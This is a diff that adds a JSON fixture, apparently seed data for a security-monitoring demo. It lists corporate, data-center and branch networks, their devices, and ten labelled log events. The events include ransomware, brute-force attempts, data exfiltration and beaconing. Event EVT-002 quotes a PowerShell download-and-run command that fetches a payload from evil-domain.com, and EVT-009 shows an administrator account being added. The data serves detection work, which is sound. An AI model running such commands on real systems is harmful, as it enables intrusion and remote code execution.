@@ -1,0 +1,194 @@
+{
+  "networks": [
+    {
+      "id": "NET-CORP",
+      "name": "Corporate Network",
+      "environment_type": "Corporate",
+      "description": "Primary corporate workstations and employee services.",
+      "sensitivity_tier": "internal"
+    },
+    {
+      "id": "NET-DC",
+      "name": "Data Center",
+      "environment_type": "Data Center",
+      "description": "Production servers and core services.",
+      "sensitivity_tier": "restricted"
+    },
+    {
+      "id": "NET-BRANCH",
+      "name": "Branch Office",
+      "environment_type": "Branch Office",
+      "description": "Remote branch network.",
+      "sensitivity_tier": "internal"
+    }
+  ],
+  "devices": [
+    {
+      "id": "DEV-CORP-WS1",
+      "network_id": "NET-CORP",
+      "hostname": "FINANCE-PC-014",
+      "ip_address": "10.0.0.14",
+      "device_type": "Windows Workstation",
+      "criticality": "medium",
+      "status": "active"
+    },
+    {
+      "id": "DEV-CORP-DC1",
+      "network_id": "NET-CORP",
+      "hostname": "CORP-DC-01",
+      "ip_address": "10.0.0.2",
+      "device_type": "Domain Controller",
+      "criticality": "critical",
+      "status": "active"
+    },
+    {
+      "id": "DEV-DC-DB1",
+      "network_id": "NET-DC",
+      "hostname": "PROD-DB-01",
+      "ip_address": "172.16.0.100",
+      "device_type": "Database Server",
+      "criticality": "critical",
+      "status": "active"
+    },
+    {
+      "id": "DEV-DC-WEB1",
+      "network_id": "NET-DC",
+      "hostname": "PROD-WEB-01",
+      "ip_address": "172.16.0.50",
+      "device_type": "Web Server",
+      "criticality": "high",
+      "status": "active"
+    },
+    {
+      "id": "DEV-DC-FW1",
+      "network_id": "NET-DC",
+      "hostname": "DC-FW-01",
+      "ip_address": "172.16.0.1",
+      "device_type": "Firewall",
+      "criticality": "critical",
+      "status": "active"
+    },
+    {
+      "id": "DEV-BRANCH-WS1",
+      "network_id": "NET-BRANCH",
+      "hostname": "BR-WS-042",
+      "ip_address": "192.168.1.42",
+      "device_type": "Windows Workstation",
+      "criticality": "low",
+      "status": "active"
+    },
+    {
+      "id": "DEV-BRANCH-ROUTER",
+      "network_id": "NET-BRANCH",
+      "hostname": "BR-RT-01",
+      "ip_address": "192.168.1.1",
+      "device_type": "Router",
+      "criticality": "high",
+      "status": "active"
+    }
+  ],
+  "events": [
+    {
+      "id": "EVT-001",
+      "network_id": "NET-CORP",
+      "device_id": "DEV-CORP-WS1",
+      "source_type": "Windows Security Event Log",
+      "event_type": "Logon",
+      "raw_message": "User FINANCE\\jsmith successfully logged on.",
+      "is_suspicious": false
+    },
+    {
+      "id": "EVT-002",
+      "network_id": "NET-BRANCH",
+      "device_id": "DEV-BRANCH-WS1",
+      "source_type": "Sysmon",
+      "event_type": "ProcessCreate",
+      "raw_message": "PowerShell executed with encoded command: powershell.exe -enc JABz... DownloadString('http://evil-domain.com/payload.ps1')",
+      "is_suspicious": true,
+      "extracted_entities": {
+        "domains": ["evil-domain.com"]
+      }
+    },
+    {
+      "id": "EVT-003",
+      "network_id": "NET-DC",
+      "device_id": "DEV-DC-DB1",
+      "source_type": "EDR",
+      "event_type": "FileModification",
+      "raw_message": "Rapid encryption of 15,000 files in C:\\Data\\. Extension changed to .crypted. Shadow copies deleted via vssadmin.exe.",
+      "is_suspicious": true
+    },
+    {
+      "id": "EVT-004",
+      "network_id": "NET-CORP",
+      "device_id": "DEV-CORP-DC1",
+      "source_type": "Windows Security Event Log",
+      "event_type": "AuthenticationFailure",
+      "raw_message": "150 failed login attempts for administrator from 10.0.0.14 within 2 minutes.",
+      "is_suspicious": true,
+      "extracted_entities": {
+        "ips": ["10.0.0.14"]
+      }
+    },
+    {
+      "id": "EVT-005",
+      "network_id": "NET-DC",
+      "device_id": "DEV-DC-WEB1",
+      "source_type": "WAF",
+      "event_type": "NetworkTraffic",
+      "raw_message": "10,000 SYN packets per second originating from multiple external IPs.",
+      "is_suspicious": true
+    },
+    {
+      "id": "EVT-006",
+      "network_id": "NET-CORP",
+      "device_id": "DEV-CORP-WS1",
+      "source_type": "DLP",
+      "event_type": "NetworkTraffic",
+      "raw_message": "50GB of archived financial data transferred to unknown external IP 203.0.113.50 over HTTPS.",
+      "is_suspicious": true,
+      "extracted_entities": {
+        "ips": ["203.0.113.50"]
+      }
+    },
+    {
+      "id": "EVT-007",
+      "network_id": "NET-BRANCH",
+      "device_id": "DEV-BRANCH-WS1",
+      "source_type": "Firewall",
+      "event_type": "NetworkTraffic",
+      "raw_message": "Periodic DNS requests to strange subdomain sdf89s.c2-tracker.net indicating possible beaconing.",
+      "is_suspicious": true,
+      "extracted_entities": {
+        "domains": ["c2-tracker.net"]
+      }
+    },
+    {
+      "id": "EVT-008",
+      "network_id": "NET-CORP",
+      "device_id": "DEV-CORP-WS1",
+      "source_type": "Antivirus",
+      "event_type": "FileCreation",
+      "raw_message": "Keylogger detected. File C:\\Windows\\Temp\\key_hook.dll matches known signature.",
+      "is_suspicious": true
+    },
+    {
+      "id": "EVT-009",
+      "network_id": "NET-DC",
+      "device_id": "DEV-DC-WEB1",
+      "source_type": "EDR",
+      "event_type": "ProcessCreate",
+      "raw_message": "svchost.exe spawned cmd.exe executing net user administrator /add.",
+      "is_suspicious": true
+    },
+    {
+      "id": "EVT-010",
+      "network_id": "NET-DC",
+      "device_id": "DEV-DC-DB1",
+      "source_type": "AccessLog",
+      "event_type": "Logon",
+      "raw_message": "DB Admin logged in at 3:00 AM on a Sunday and accessed all customer tables.",
+      "is_suspicious": true
+    }
+  ]
+}
